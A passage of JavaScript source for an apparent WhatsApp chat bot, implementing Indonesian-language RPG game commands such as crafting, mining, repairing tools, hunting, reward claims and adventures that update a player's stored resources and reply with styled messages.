      global.db.erpg[m.sender].besi -= besi
      global.db.erpg[m.sender].kayu -= kayu
      global.db.erpg[m.sender].kain -= kain
      let bajuzirah = `*Berhasil Membuat Baju Zirah!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n- Kain: ${global.db.erpg[m.sender].kain}\n\n`
      await sock.sendMessage(m.chat, { text: bajuzirah, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME (Tools Crafting)", body: 'Making equipment', thumbnailUrl: "https://telegra.ph/file/2a8bf170a5b74aa808078.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    } else if (args[0] === "pedang") {
      if (global.db.erpg[m.sender].pedang) return reply('Kamu Sudah Memiliki Pedang!')
      let besi = Number(3)
      let kayu = Number(1)
      if (global.db.erpg[m.sender].besi < besi) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
      if (global.db.erpg[m.sender].kayu < kayu) return reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
      global.db.erpg[m.sender].pedang = true
      global.db.erpg[m.sender].besi -= besi
      global.db.erpg[m.sender].kayu -= kayu
      let pedang = `*Berhasil Membuat Pedang!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n\n`
      await sock.sendMessage(m.chat, { text: pedang, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME (Tools Crafting)", body: 'Making equipment', thumbnailUrl: "https://telegra.ph/file/0c245751d14b42fe7f3c0.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    } else {
      let craft = `*Apa Yang Ingin Kamu Buat?*\n\n  ${vircion} â€¢ kapal\n  ${vircion} â€¢ rumah\n  ${vircion} â€¢ kapak\n  ${vircion} â€¢ pickaxe\n  ${vircion} â€¢ pedang\n  ${vircion} â€¢ bajuzirah\n  ${vircion} â€¢ kain\n\n*Contoh:*\n.craft kapak`
      await sock.sendMessage(m.chat, { text: craft, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME (Crafting Item)", body: 'Make items for survival and adventure', thumbnailUrl: "https://telegra.ph/file/fed81e9a280d8a3965d6f.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    }
    break
  }

  case 'heal': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].potion < 1) return reply(`Potion Kamu Habis\nKetik .buy potion 1`)
    let health = await randomNomor(34, 89)
    let stamina = await randomNomor(55, .78)
    global.db.erpg[m.sender].potion -= 1
    global.db.erpg[m.sender].darahuser += health
    global.db.erpg[m.sender].stamina += stamina
    reply(`Berhasil Memulihkan Dengan Potion\nHealth: +${health}\nStamina: +${stamina}`)
    break
  }

  case 'mining': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (!global.db.erpg[m.sender].pickaxe) return reply('Kamu Tidak Memiliki pickaxe\nSilahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
    if (global.db.erpg[m.sender].darahpickaxe < 1) return reply('â˜¹ï¸Pickaxe Kamu Rusak\nRawat Dulu Alat Tambangmu\n\nKetik _.rawat_')
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    let besi = [2, 1, 6, 1, 0, 3, 7, 8, 3, 2, 0, 7, 1, 9]
    let batubara = [1, 1, 2, 1, 0, 6, 0, 0, 2, 5, 1, 0, 1, 0]
    let emas = [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0]
    let perak = [2, 1, 3, 5, 0, 0, 0, 0, 0, 2, 1, 0, 8, 2]
    let diamond = [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0]
    let emerald = [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0]
    const besinyo = await pickRandom(besi)
    const batubaranyo = await pickRandom(batubara)
    const emasnyo = await pickRandom(emas)
    const peraknyo = await pickRandom(perak)
    const diamondnyo = await pickRandom(diamond)
    const emeraldnyo = await pickRandom(emerald)
    let mining = `*MINING ADVENTURE*\n\nItem Yang Didapat :\n  ${vircion} â€¢ Besi: ${besinyo}\n  ${vircion} â€¢ Emas: ${emasnyo}\n  ${vircion} â€¢ Perak: ${peraknyo}\n  ${vircion} â€¢ Batu Bara: ${batubaranyo}\nDiamond: ${diamondnyo}\nEmerald: ${emeraldnyo}\n\n_ğŸ§° Disimpan Dalam Inventory..._\n_â¤ï¸ Darah Berkurang 20_\n_â›ï¸ Ketahanan Pickaxe ${global.db.erpg[m.sender].darahpickaxe}%_\n\n`
    await sock.sendMessage(m.chat, { text: mining, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG-GAME (Mining Resource)", body: 'Mining natural resources', thumbnailUrl: "https://telegra.ph/file/4ca67ad95bce6afa1a0f2.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    global.db.erpg[m.sender].darahpickaxe -= 20
    global.db.erpg[m.sender].besi += besinyo
    global.db.erpg[m.sender].emas += emasnyo
    global.db.erpg[m.sender].perak += peraknyo
    global.db.erpg[m.sender].batubara += batubaranyo
    break
  }

  case 'repair':
  case 'rawat': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    let rawat = args[0]
    switch (rawat) {
      case 'kapal':
        if (!global.db.erpg[m.sender].kapal) return reply(`*Kamu Gak Punya Kapal*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapal`)
        if (!global.db.erpg[m.sender].darahkapal < 1) return reply(`*Kapal Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 5) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *5 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kayu < 10) return reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *10 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 5
        global.db.erpg[m.sender].kayu -= 10
        global.db.erpg[m.sender].darahkapal = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      case 'pickaxe':
        if (!global.db.erpg[m.sender].pickaxe) return reply(`*Kamu Gak Punya Pickaxe*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pickaxe`)
        if (!global.db.erpg[m.sender].darahpickaxe < 1) return reply(`*Pickaxe Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 1) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pickaxe*\n\nUntuk Perbaikan Pickaxe Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 1
        global.db.erpg[m.sender].darahpickaxe = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      case 'kapak':
        if (!global.db.erpg[m.sender].kapak) return reply(`*Kamu Gak Punya Kapak*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapak`)
        if (!global.db.erpg[m.sender].darahkapak < 1) return reply(`*Kapak Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 1) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapak*\n\nUntuk Perbaikan Kapak Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 1
        global.db.erpg[m.sender].darahkapak = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      case 'armor':
        if (!global.db.erpg[m.sender].bzirah) return reply(`*Kamu Gak Punya Baju Zirah*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Baju Zirah`)
        if (!global.db.erpg[m.sender].darahbzirah < 1) return reply(`*Baju Zirah Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 2) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Armor*\n\nUntuk Perbaikan Armor Diperlukan *2 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 2
        global.db.erpg[m.sender].darahbzirah = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      case 'pedang':
        if (!global.db.erpg[m.sender].pedang) return reply(`*Kamu Gak Punya Pedang*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pedang`)
        if (!global.db.erpg[m.sender].darahpedang < 1) return reply(`*Pedang Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 1) return reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pedang*\n\nUntuk Perbaikan Pedang Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 1
        global.db.erpg[m.sender].darahpedang = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      default:
        let teks = `---------- Â» *PERBAIKAN* Â« ----------\n\n*Pilih Barang Yang*\n*Akan Di perbaiki*\n  ${vircion} â€¢ kapal\n  ${vircion} â€¢ pickaxe\n  ${vircion} â€¢ kapak\n  ${vircion} â€¢ armor\n  ${vircion} â€¢ pedang\n\n*Contoh:*\n${cmd} kapak`
        sock.sendMessage(m.chat, { text: teks, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG TOOLS REPAIR", body: 'Repairs and upgrades tools', thumbnailUrl: "https://telegra.ph/file/08e78c20afd16dcebb33d.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    }
    break
  }

  case 'menebang':
  case 'nebang': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (!global.db.erpg[m.sender].kapak) return reply('Kamu Tidak Memiliki Kapak, Silahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
    if (global.db.erpg[m.sender].darahkapak < 1) return reply('â˜¹ï¸Kapak Kamu Rusak\nRawat Dulu Alat Tebangmu\n\nKetik _.rawat_')
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    let kayu = await randomNomor(0, 20)
    global.db.erpg[m.sender].kayu += kayu
    global.db.erpg[m.sender].darahkapak -= 20
    reply(`*ğŸŒ³ MENEBANG POHON ğŸŒ³*\n\nItem Yang Didapat:\n  ${vircion} â€¢ Kayu: ${kayu} (Hasil Tebang)\n  ${vircion} â€¢ Kapak: -20 Healthy (Digunakan)`)
    break
  }

  case 'weekly':
  case 'mingguan': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    try {
      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].weeklyclaim)
      if (new Date() - global.db.erpg[m.sender].weeklyclaim < 604800000) return reply(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Minggu.`)
      let saldo = await randomNomor(1000, 10000)
      let limit = await randomNomor(20, 100)
      global.db.erpg[m.sender].weeklyclaim = new Date * 1
      db.users[m.sender].saldo += saldo
      db.users[m.sender].limit += limit
      reply(`Selamat Kamu Mendapatkan:\n\n*ğŸ HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
    } catch (err) {
      console.error(err)
      reply('Terjadi kesalahan: ' + err)
    }
    break
  }

  case 'monthly':
  case 'bulanan': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    try {
      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].monthlyclaim)
      if (new Date() - global.db.erpg[m.sender].monthlyclaim < 5184000000) return reply(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Bulan.`)
      let saldo = await randomNomor(5000, 50000)
      let limit = await randomNomor(30, 200)
      global.db.erpg[m.sender].monthlyclaim = new Date * 1
      db.users[m.sender].saldo += saldo
      db.users[m.sender].limit += limit
      reply(`Selamat Kamu Mendapatkan:\n\n*ğŸ HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
    } catch (err) {
      console.error(err)
      reply('Terjadi kesalahan: ' + err)
    }
    break
  }

  case 'yearly':
  case 'tahunan': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!isPremium) return reply(mess.prem)
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    try {
      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].yearlyclaim)
      if (new Date() - global.db.erpg[m.sender].yearlyclaim < 31536000000) return reply(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Tahun.`)
      let saldo = await randomNomor(600000, 6000000)
      let limit = await randomNomor(4000, 24000)
      global.db.erpg[m.sender].yearlyclaim = new Date * 1
      db.users[m.sender].saldo += saldo
      db.users[m.sender].limit += limit
      reply(`Selamat Kamu Mendapatkan:\n\n*ğŸ HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
    } catch (err) {
      console.error(err)
      reply('Terjadi kesalahan: ' + err)
    }
    break
  }

  case 'berburu': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    let darah = await randomNomor(45, 70)
    let domba = await randomNomor(0, 10)
    let sapi = await randomNomor(0, 10)
    let ayam = await randomNomor(0, 35)
    let banteng = await randomNomor(0, 10)
    let kambing = await randomNomor(0, 10)
    let kerbau = await randomNomor(0, 10)
    let babihutan = await randomNomor(0, 20)
    let monyet = await randomNomor(0, 10)
    let babi = await randomNomor(0, 17)
    let panda = await randomNomor(0, 7)
    let harimau = await randomNomor(0, 4)
    let gajah = await randomNomor(0, 3)
    let buaya = await randomNomor(0, 10)
    let buulu = domba + sapi + ayam
    let bulu = buulu / 2
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].burutime)
    if (new Date() - global.db.erpg[m.sender].burutime < 18000000) return reply(`Kamu Baru Saja Berburu ${waktuu} Yang Lalu, Silahkan Tunggu 5 Jam Setelah Terakhir Kali Berburu`)
    global.db.erpg[m.sender].burutime = new Date * 1
    global.db.erpg[m.sender].domba += domba
    global.db.erpg[m.sender].sapi += sapi
    global.db.erpg[m.sender].ayam += ayam
    global.db.erpg[m.sender].bulu += bulu
    global.db.erpg[m.sender].banteng += banteng
    global.db.erpg[m.sender].kambing += kambing
    global.db.erpg[m.sender].kerbau += kerbau
    global.db.erpg[m.sender].babihutan += babihutan
    global.db.erpg[m.sender].monyet += monyet
    global.db.erpg[m.sender].babi += babi
    global.db.erpg[m.sender].panda += panda
    global.db.erpg[m.sender].harimau += harimau
    global.db.erpg[m.sender].gajah += gajah
    global.db.erpg[m.sender].babihutan += buaya
    global.db.erpg[m.sender].darahuser -= darah
    reply(`*ğŸ¹ BERBURU ğŸ¹*\n\nItem Yang Didapat:\n  ${vircion} â€¢ Domba: ${domba}\n  ${vircion} â€¢ Sapi: ${sapi}\n  ${vircion} â€¢ Ayam: ${ayam}\n  ${vircion} â€¢ Banteng: ${banteng}\n  ${vircion} â€¢ Kambing: ${kambing}\n  ${vircion} â€¢ Kerbau: ${kerbau}\n  ${vircion} â€¢ Babi Hutan: ${babihutan}\n  ${vircion} â€¢ Monyet: ${monyet}\n  ${vircion} â€¢ Babi: ${babi}\n  ${vircion} â€¢ Panda: ${panda}\n  ${vircion} â€¢ Harimau: ${harimau}\n  ${vircion} â€¢ Gajah: ${gajah}\n  ${vircion} â€¢ Bulu: ${bulu} (Hasil Pencabutan)\n\n  ${vircion} â€¢ Darah Berkurang: ${darah}%\n  \n_Tunggu 5 jam untuk_\n_berburu berikutnya_`)
    break
  }

  case 'adventure': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].darahuser < 1) return reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    var tuju = args.join(" ")
    let obj = ["villager", "zombie", "ghasts", "wither", "skeleton", "wolves"]
    let obje = await pickRandom(obj)
    let kayu = await randomNomor(15)
    let besi = await randomNomor(10)
    let rank = await randomNomor(100)
    let saldo = await randomNomor(2000)
    let perak = await randomNomor(10)
    let emerald = await randomNomor(5)
    let mythic = await randomNomor(7)
    let uncommon = await randomNomor(15)
    let common = await randomNomor(10)
    let diamond = await randomNomor(5)
    let legendary = await randomNomor(3)
    if (tuju === "savanah") {
      global.db.erpg[m.sender].darahuser -= 20
      let thumbadv = "https://telegra.ph/file/1b27b199f440cd69be0aa.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -20*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
    } else if (tuju === "dessert") {
      global.db.erpg[m.sender].darahuser -= 20
      let thumbadv = "https://telegra.ph/file/760e27568c0b2ccf07231.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -20*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
    } else if (tuju === "boreal forest") {
      global.db.erpg[m.sender].darahuser -= 20
      let thumbadv = "https://telegra.ph/file/1a528cf0c7e1eb0e74976.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -20*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
    } else if (tuju === "tropical forest") {
      global.db.erpg[m.sender].darahuser -= 20
      let thumbadv = "https://telegra.ph/file/bbc4d8eb053479d69e5f7.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -20*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
    } else if (tuju === "underground") {
      global.db.erpg[m.sender].darahuser -= 30
      let thumbadv = "https://telegra.ph/file/b7f11f5383cc421ff0ce8-93abbbb8e9f5ca6dc2.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Emerald: ${emerald}\n  ${vircion} â€¢ Perak: ${perak}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -30*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
      global.db.erpg[m.sender].emerald += emerald
      global.db.erpg[m.sender].perak += perak
    } else if (tuju === "shadownland") {
      global.db.erpg[m.sender].darahuser -= 40
      let thumbadv = "https://telegra.ph/file/e70bbe68c4bad74b43311-006005796ede87da36.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
      let adv = `---------- Â» *ADVENTURE* Â« ----------\n\n*ğŸ“ ${text}*\n  ${vircion} â€¢ Kayu: ${kayu}\n  ${vircion} â€¢ Besi: ${besi}\n  ${vircion} â€¢ Rank: ${rank}\n  ${vircion} â€¢ Emerald: ${emerald}\n  ${vircion} â€¢ Perak: ${perak}\n  ${vircion} â€¢ Uang: Rp ${saldo}\n\n*Stamina berkurang -40*`
      await sock.sendMessage(m.chat, { text: adv, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - ADVENTURE", body: 'Adventure exploring the world', thumbnailUrl: thumbadv, sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].besi += besi
      global.db.erpg[m.sender].rank += rank
      db.users[m.sender].saldo += saldo
      global.db.erpg[m.sender].emerald += emerald
      global.db.erpg[m.sender].perak += perak
    } else if (tuju === "dragons peak") {
      global.db.erpg[m.sender].darahuser -= 55
      let thumbadv = "https://telegra.ph/file/514c00efd64770a6f9a0c-b16de076ca5d6870c0.jpg"
      let { key } = await sock.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...' }, { quoted: fakeQuoted })
      await sleep(3000)
      await sock.sendMessage(m.chat, { text: `Kamu bertemu dengan ${obje}`, edit: key })
      await sleep(5000)
      await sock.sendMessage(m.chat, { text: `Menjelajah...`, edit: key })
      await sleep(3000)
